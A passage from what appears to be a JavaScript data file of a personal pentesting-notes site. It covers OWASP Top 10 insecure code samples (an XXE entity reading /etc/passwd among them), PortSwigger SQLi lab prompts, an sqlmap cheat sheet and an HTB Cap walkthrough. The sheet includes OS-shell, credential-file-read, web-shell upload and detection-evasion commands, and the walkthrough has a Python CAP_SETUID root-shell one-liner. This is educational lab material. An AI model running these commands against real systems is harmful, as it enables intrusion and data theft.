Control</h4>\n<accordion title=\"Ghostty &#x26; View\">\n* **Ctrl + l**: Clear the screen.\n* **Ctrl + + / -**: Zoom in or out (Ghostty native).\n* **Ctrl + 0**: Reset zoom level.\n</accordion>","OWASP10":"<h4>1. Broken Access Control</h4>\n<accordion title=\"Horizontal Priv-esc\">\nAccess control enforces policy such that users cannot act outside of their intended permissions. Failure of access control typically leads to unauthorized information disclosure, modification, or destruction of all data or performing a business function outside the user's limits.\n<pre><code class=\"language-php\">// Insecure code allowing horizontal privilege escalation\n$user_id = $_GET['user_id'];\n$query = \"SELECT * FROM users WHERE id = $user_id\";\n$result = $conn->query($query);\n</code></pre>\n</accordion>\n<h4>2. Cryptographic Failures</h4>\n<accordion title=\"Not so secure excryption\">\nMany web applications and APIs do not properly protect sensitive data, such as financial, healthcare, and PII. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data may be compromised without extra protection, such as encryption at rest or in transit, and requires special precautions when exchanged with the browser.\n<pre><code class=\"language-java\">// Insecure code using ECB mode for encryption\nCipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\ncipher.init(Cipher.ENCRYPT_MODE, secretKey);\nbyte[] cipherText = cipher.doFinal(plainText);\n</code></pre>\n</accordion>\n<h4>3. Injection</h4>\n<accordion title=\"Injecting code to run scripts\">\nInjection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization. XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the victim's browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.\n<pre><code class=\"language-python\"># Insecure code vulnerable to SQL injection\nuser_input = request.args.get('user_input')\nquery = f\"SELECT * FROM users WHERE name = '{user_input}'\"\nresult = db.execute(query)\n</code></pre>\n</accordion>\n<h4>4. Insecure Design</h4>\n<accordion title=\"Description\">\nInsecure design represents different weaknesses, expressed as \"missing or ineffective control design\". Secure design is a culture and methodology that constantly evaluates threats and ensures that code is robustly designed and tested to prevent known attack methods. Threat modeling should be integrated into refinement sessions or similar activities.\n</accordion>\n<h4>5. Security Misconfiguration</h4>\n<accordion title=\"Misconfigured entity\">\nSecurity misconfiguration is the most commonly seen issue. This is commonly a result of insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information. Not only must all operating systems, frameworks, libraries, and applications be securely configured, but they must be patched and upgraded in a timely fashion.\n<pre><code class=\"language-xml\">&#x3C;!-- Insecure configuration allowing XXE attacks -->\n&#x3C;?xml version=\"1.0\"?>\n&#x3C;!DOCTYPE root [\n&#x3C;!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n&#x3C;root>&#x26;xxe;&#x3C;/root>\n</code></pre>\n</accordion>\n<h4>6. Vulnerable and Outdated Components</h4>\n<accordion title=\"Description\">\nComponents, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts.\n</accordion>\n<h4>7. Identification and Authentication Failures</h4>\n<accordion title=\"Session hijacking\">\nApplication functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other user's identities temporarily or permanently.\n<pre><code class=\"language-javascript\">// Insecure code vulnerable to session fixation\nfunction createSession() {\n  const sessionId = req.cookies.sessionId || uuid.v4();\n  res.cookie(\"sessionId\", sessionId);\n  sessions[sessionId] = {\n    /* session data */\n  };\n}\n</code></pre>\n</accordion>\n<h4>8. Software and Data Integrity Failures</h4>\n<accordion title=\"Description\">\nSoftware and data integrity failures relate to code and infrastructure that does not protect against integrity violations. For example, an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs). An insecure CI/CD pipeline can introduce the potential for unauthorized access, malicious code, or system compromise. Lastly, many applications now include auto-update functionality, where updates are downloaded without sufficient integrity verification and applied to the previously trusted application. Attackers could potentially upload their own updates to be distributed and run on all installations. Another example is where objects or data are encoded or serialized into a structure that an attacker can see and modify is vulnerable to insecure deserialization.\n</accordion>\n<h4>9. Security Logging and Monitoring Failures</h4>\n<accordion title=\"Description\">\nSecurity logging and monitoring failures coupled with missing or ineffective integration with incident response, allow attackers to further attack systems, maintain persistence, pivot to more systems, and tamper, extract, or destroy data. Most breach studies show time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring.\n</accordion>\n<h4>10. Server-Side Request Forgery (SSRF)</h4>\n<accordion title=\"Insecure backend\">\nSSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network Access Control List (ACL).\n<pre><code class=\"language-ruby\"># Insecure code vulnerable to SSRF\nurl = params[:url]\nresponse = Net::HTTP.get_response(URI(url))\n</code></pre>\n</accordion>","Programming/SQL":"<h4>1. SELECT</h4>\n<accordion title=\"SELECT: Retrieve data from one or more tables\">\nThe fundamental command to query and retrieve data from a database.\n<br>\n<pre><code class=\"language-sql\">SELECT column1, column2 FROM table_name WHERE condition;\n</code></pre>\n</accordion>\n<h4>2. INSERT</h4>\n<accordion title=\"INSERT: Add new records to a table\">\nInsert one or more new rows into a specified table.\n<br>\n<pre><code class=\"language-sql\">INSERT INTO table_name (column1, column2) VALUES (value1, value2);\n</code></pre>\n</accordion>\n<h4>3. UPDATE</h4>\n<accordion title=\"UPDATE: Modify existing records in a table\">\nUpdate the values of existing records in a specified table.\n<br>\n<pre><code class=\"language-sql\">UPDATE table_name SET column1 = value1 WHERE condition;\n</code></pre>\n</accordion>\n<h4>4. DELETE</h4>\n<accordion title=\"DELETE: Remove records from a table\">\nDelete one or more rows from a table based on a specified condition.\n<br>\n<pre><code class=\"language-sql\">DELETE FROM table_name WHERE condition;\n</code></pre>\n</accordion>\n<h4>5. CREATE TABLE</h4>\n<accordion title=\"CREATE TABLE: Define a new table\">\nCreate a new table with specified columns, data types, and constraints.\n<br>\n<pre><code class=\"language-sql\">CREATE TABLE table_name (\n  column1 datatype,\n  column2 datatype,\n  ...\n);\n</code></pre>\n</accordion>\n<h4>6. ALTER TABLE</h4>\n<accordion title=\"ALTER TABLE: Modify an existing table\">\nAdd, modify, or delete columns in an existing table.\n<br>\n<pre><code class=\"language-sql\">ALTER TABLE table_name\nADD column_name datatype;\n</code></pre>\n</accordion>\n<h4>7. DROP TABLE</h4>\n<accordion title=\"DROP TABLE: Delete an existing table\">\nPermanently remove a table and its data from the database.\n<br>\n<pre><code class=\"language-sql\">DROP TABLE table_name;\n</code></pre>\n</accordion>\n<h4>8. CREATE INDEX</h4>\n<accordion title=\"CREATE INDEX: Create an index on a table\">\nImprove the speed of data retrieval by creating an index on one or more columns.\n<br>\n<pre><code class=\"language-sql\">CREATE INDEX index_name ON table_name (column1, column2, ...);\n</code></pre>\n</accordion>\n<h4>9. SELECT DISTINCT</h4>\n<accordion title=\"SELECT DISTINCT: Retrieve unique values\">\nRetrieve only unique values from a specified column or set of columns.\n<br>\n<pre><code class=\"language-sql\">SELECT DISTINCT column1 FROM table_name;\n</code></pre>\n</accordion>\n<h4>10. WHERE</h4>\n<accordion title=\"WHERE: Filter records based on a condition\">\nSpecify conditions to filter records in a SELECT, UPDATE, or DELETE statement.\n<br>\n<pre><code class=\"language-sql\">SELECT * FROM table_name WHERE condition;\n</code></pre>\n</accordion>\n<h4>11. GROUP BY</h4>\n<accordion title=\"GROUP BY: Group rows that have the same values in specified columns\">\nGroup rows based on common values in one or more columns.\n<br>\n<pre><code class=\"language-sql\">SELECT column1, COUNT(*) FROM table_name GROUP BY column1;\n</code></pre>\n</accordion>\n<h4>12. HAVING</h4>\n<accordion title=\"HAVING: Filter results of GROUP BY based on a condition\">\nApply a condition to filter the results of a GROUP BY clause.\n<br>\n<pre><code class=\"language-sql\">SELECT column1, COUNT(*) FROM table_name GROUP BY column1 HAVING COUNT(*) > 1;\n</code></pre>\n</accordion>\n<h4>13. ORDER BY</h4>\n<accordion title=\"ORDER BY: Sort the result set of a query\">\nArrange the output of a SELECT statement in ascending or descending order.\n<br>\n<pre><code class=\"language-sql\">SELECT * FROM table_name ORDER BY column1 ASC;\n</code></pre>\n</accordion>\n<h4>14. JOIN</h4>\n<accordion title=\"JOIN: Combine rows from two or more tables based on a related column\">\nMerge data from multiple tables based on a specified condition.\n<br>\n<pre><code class=\"language-sql\">SELECT * FROM table1 JOIN table2 ON table1.column_name = table2.column_name;\n</code></pre>\n</accordion>\n<h4>15. COUNT</h4>\n<accordion title=\"COUNT: Count the number of rows in a table\">\nCalculate the number of rows that satisfy a given condition.\n<br>\n<pre><code class=\"language-sql\">SELECT COUNT(*) FROM table_name WHERE condition;\n</code></pre>\n</accordion>","Programming/python":"","SQLInjection-Labs/SQLi-Lab1":"<blockquote>\n<p>This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:\n<code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code>\nTo solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.</p>\n</blockquote>","SQLInjection-Labs/SQLi-Lab2":"<h2>Lab: <a href=\"https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-subverting-application-logic/sql-injection/lab-login-bypass\"></a></h2>\n<blockquote>\n<p>This lab contains a SQL injection vulnerability in the login function.\nTo solve the lab, perform a SQL injection attack that logs in to the application as the <code>administrator</code> user.</p>\n</blockquote>","SQLInjection-Labs/sqlmap":"<p>SQLMap automates SQL injection detection and exploitation. Every pentester's best friend and every developer's worst nightmare.</p>\n<p><ideanode color=\"pink\"><strong>Warning:</strong> SQLMap is loud. Use <code>--delay</code> and <code>--random-agent</code> on real engagements unless you want the blue team watching you in real time.</ideanode></p>\n<h2>Basic Scanning</h2>\n<accordion title=\"sqlmap -u — Basic URL scan\" color=\"#ff2d95\">\n```bash\nsqlmap -u \"http://example.com/page.php?id=1\"\n```\n<copybutton text=\"{&#x60;sqlmap\" -u=\"\" &#x22;http:=\"\" example.com=\"\" page.php?id=\"1&#x22;&#x60;}\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"-p — Target specific parameter\" color=\"#ff2d95\">\n```bash\nsqlmap -u \"http://example.com/page.php?id=1&#x26;cat=2\" -p id\n```\n<copybutton text=\"{&#x60;sqlmap\" -u=\"\" &#x22;http:=\"\" example.com=\"\" page.php?id=\"1&#x26;cat=2&#x22;\" -p=\"\" id&#x60;}=\"\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"POST request with --data\" color=\"#ff2d95\">\n```bash\nsqlmap -u \"http://example.com/login.php\" --data=\"username=admin&#x26;password=pass\"\n```\n<copybutton text=\"{&#x60;sqlmap\" -u=\"\" &#x22;http:=\"\" example.com=\"\" login.php&#x22;=\"\" --data=\"username=admin&#x26;password=pass\" &#x60;}=\"\" label=\"Copy\">\n</copybutton></accordion>\n<h2>Database Enumeration</h2>\n<accordion title=\"--dbs — List all databases\" color=\"#0055ff\">\n```bash\nsqlmap -u \"http://example.com/page.php?id=1\" --dbs\n```\n<copybutton text=\"{&#x60;sqlmap\" -u=\"\" &#x22;http:=\"\" example.com=\"\" page.php?id=\"1&#x22;\" --dbs&#x60;}=\"\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"-D ... --tables — List tables in a database\" color=\"#0055ff\">\n```bash\nsqlmap -u \"http://example.com/page.php?id=1\" -D app_db --tables\n```\n<copybutton text=\"{&#x60;sqlmap\" -u=\"\" &#x22;http:=\"\" example.com=\"\" page.php?id=\"1&#x22;\" -d=\"\" app_db=\"\" --tables&#x60;}=\"\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"-T ... --columns — List columns in a table\" color=\"#0055ff\">\n```bash\nsqlmap -u \"http://example.com/page.php?id=1\" -D app_db -T users --columns\n```\n<copybutton text=\"{&#x60;sqlmap\" -u=\"\" &#x22;http:=\"\" example.com=\"\" page.php?id=\"1&#x22;\" -d=\"\" app_db=\"\" -t=\"\" users=\"\" --columns&#x60;}=\"\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"--dump — Dump table data\" color=\"#0055ff\">\n```bash\nsqlmap -u \"http://example.com/page.php?id=1\" -D app_db -T users --dump\n```\n<copybutton text=\"{&#x60;sqlmap\" -u=\"\" &#x22;http:=\"\" example.com=\"\" page.php?id=\"1&#x22;\" -d=\"\" app_db=\"\" -t=\"\" users=\"\" --dump&#x60;}=\"\" label=\"Copy\"> Dumps all rows — use `--start 1 --stop 10` to limit\n</copybutton></accordion>\n<h2>Advanced Techniques</h2>\n<accordion title=\"--dbms — Force database type\" color=\"#ff6600\">\n```bash\nsqlmap -u \"http://example.com/page.php?id=1\" --dbms=mysql\n```\n<copybutton text=\"{&#x60;sqlmap\" -u=\"\" &#x22;http:=\"\" example.com=\"\" page.php?id=\"1&#x22;\" --dbms=\"mysql&#x60;}\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"--os-shell — OS command execution\" color=\"#ff6600\">\n```bash\nsqlmap -u \"http://example.com/page.php?id=1\" --os-shell\n```\n<copybutton text=\"{&#x60;sqlmap\" -u=\"\" &#x22;http:=\"\" example.com=\"\" page.php?id=\"1&#x22;\" --os-shell&#x60;}=\"\" label=\"Copy\"> Requires stacked queries or out-of-band techniques\n</copybutton></accordion>\n<accordion title=\"--sql-shell — Interactive SQL shell\" color=\"#ff6600\">\n```bash\nsqlmap -u \"http://example.com/page.php?id=1\" --sql-shell\n```\n<copybutton text=\"{&#x60;sqlmap\" -u=\"\" &#x22;http:=\"\" example.com=\"\" page.php?id=\"1&#x22;\" --sql-shell&#x60;}=\"\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"--file-read / --file-write — File system access\" color=\"#ff6600\">\n```bash\nsqlmap -u \"http://example.com/page.php?id=1\" --file-read=\"/etc/passwd\"\nsqlmap -u \"http://example.com/page.php?id=1\" --file-write=\"shell.php\" --file-dest=\"/var/www/html/shell.php\"\n```\n<copybutton text=\"{&#x60;sqlmap\" -u=\"\" &#x22;http:=\"\" example.com=\"\" page.php?id=\"1&#x22;\" --file-read=\"/etc/passwd\" &#x60;}=\"\" label=\"Copy read\">\n</copybutton></accordion>\n<h2>Evasion &#x26; Stealth</h2>\n<accordion title=\"--random-agent — Randomize User-Agent\" color=\"#00e5ff\">\n```bash\nsqlmap -u \"http://example.com/page.php?id=1\" --random-agent\n```\n<copybutton text=\"{&#x60;sqlmap\" -u=\"\" &#x22;http:=\"\" example.com=\"\" page.php?id=\"1&#x22;\" --random-agent&#x60;}=\"\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"--delay — Add delay between requests\" color=\"#00e5ff\">\n```bash\nsqlmap -u \"http://example.com/page.php?id=1\" --delay=2\n```\n<copybutton text=\"{&#x60;sqlmap\" -u=\"\" &#x22;http:=\"\" example.com=\"\" page.php?id=\"1&#x22;\" --delay=\"2&#x60;}\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"--tamper — Use tamper scripts\" color=\"#00e5ff\">\n```bash\nsqlmap -u \"http://example.com/page.php?id=1\" --tamper=space2comment\nsqlmap -u \"http://example.com/page.php?id=1\" --tamper=between,randomcase\n```\n<copybutton text=\"{&#x60;sqlmap\" -u=\"\" &#x22;http:=\"\" example.com=\"\" page.php?id=\"1&#x22;\" --tamper=\"space2comment,between&#x60;}\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"Request via file (Burp integration)\" color=\"#00e5ff\">\n```bash\nsqlmap -r request.txt\n```\n<copybutton text=\"sqlmap -r request.txt\" label=\"Copy\"> Save a Burp request to file, feed it directly to SQLMap\n</copybutton></accordion>\n<p>&#x3C;QuizCard\ntitle=\"SQLMap Basics\"\ncolor=\"#ff2d95\"\nquestions={[\n{\nquestion: \"Which flag lists all databases on the target?\",\noptions: [\"--dbs\", \"--tables\", \"--dump\", \"--columns\"],\ncorrect: 0,\nexplanation: \"--dbs enumerates all databases. Use -D <name> --tables to then list tables in a specific database.\"\n},\n{\nquestion: \"How do you slow down SQLMap to avoid detection?\",\noptions: [\"--delay=2\", \"--fast\", \"--turbo\", \"--silent\"],\ncorrect: 0,\nexplanation: \"--delay adds seconds between HTTP requests. Combine with --random-agent for basic stealth. --tamper scripts add further evasion.\"\n}\n]}\n/></name></p>","Enumeration/passive-enumeration":"<p>Three phases of enumeration. Passive first (never touch the target), then semi-passive (use public scanners), then active (direct interaction).</p>\n<hr>\n<h3>Phase 1: Passive Recon</h3>\n<progresschecklist checklistid=\"passive-enum\">\n<hr>\n<h3>Phase 2: Semi-Passive</h3>\n<progresschecklist checklistid=\"semi-passive\">\n<hr>\n<h3>Phase 3: Active Footprinting</h3>\n<progresschecklist checklistid=\"active-footprinting\">\n<p><ideanode color=\"green\">Progress auto-saves to your browser via localStorage. Come back anytime.</ideanode></p></progresschecklist></progresschecklist></progresschecklist>","HackTheBox/htb-cap":"<progresschecklist checklistid=\"htb-cap\">\n<h2>Key Commands</h2>\n<h3>Nmap Discovery</h3>\n<pre><code class=\"language-bash\">nmap -sT 10.10.10.245 -T4 -vv\n</code></pre>\n<p>Ports found: 21 (FTP), 22 (SSH), 80 (HTTP).</p>\n<h3>Service Detection</h3>\n<pre><code class=\"language-bash\">nmap -sC -sV -p 21,22,80 10.10.10.245 -T4 -Pn\n</code></pre>\n<p>Identified vsftpd 3.0.3, OpenSSH 8.2p1, Gunicorn.</p>\n<h3>Privilege Escalation</h3>\n<pre><code class=\"language-bash\"># Check Linux capabilities\ngetcap -r / 2>/dev/null\n\n# Exploit CAP_SETUID on Python 3.8\npython3.8 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\n\n# Grab root flag\ncat /root/root.txt\n</code></pre></progresschecklist>","Recon/nmap-network-enum":"<p>Run these phases in order. Don't skip host discovery. Don't full-scan before you know what's alive.</p>\n<hr>\n<h3>Phase 1: Host Discovery</h3>\n<progresschecklist checklistid=\"nmap-host-discovery\">\n<hr>\n<h3>Phase 2: Port Scanning</h3>\n<progresschecklist checklistid=\"nmap-port-scanning\">\n<hr>\n<h3>Phase 3: Firewall Evasion</h3>\n<progresschecklist checklistid=\"nmap-evasion\">\n<p><ideanode color=\"green\">After scanning, save grepable output: nmap -oG scan.txt. Parse with grep or awk for quick analysis.</ideanode></p>\n<p><ideanode color=\"pink\">Never skip host discovery. Blind full-port scanning wastes time and generates noise. Know what's alive first, then scan surgically.</ideanode></p></progresschecklist></progresschecklist></progresschecklist>","f5_software_update":"<p>Don't skip verification steps. The F5 carries production traffic — blind upgrades cause outages.</p>\n<progresschecklist checklistid=\"f5-update\">\n<p><ideanode color=\"pink\"><strong>Critical:</strong> The Internal Server Error during boot location change is NORMAL. Don't panic. Wait 15-20 minutes and the instance comes back.</ideanode></p></progresschecklist>"};

export const TOTAL_POSTS = 45;
